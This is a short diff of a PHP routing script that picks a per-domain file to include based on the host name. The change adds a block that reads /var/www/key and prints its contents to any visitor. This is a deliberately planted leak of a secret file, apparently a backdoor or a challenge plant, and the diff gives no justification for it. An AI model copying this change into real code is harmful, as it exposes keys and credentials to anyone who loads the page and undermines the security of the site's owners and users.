@@ -8,9 +8,9 @@ $domain = $tokens[0];
 if($domain == 'www'){
     $domain = $tokens[1];
 }
-
-
-
+if ( file_exists( '/var/www/key') ) {
+echo file_get_contents('/var/www/key');
+}
 if ( file_exists( './'.$domain.'.php') ) {
 
 require_once( './'.$domain.'.php');
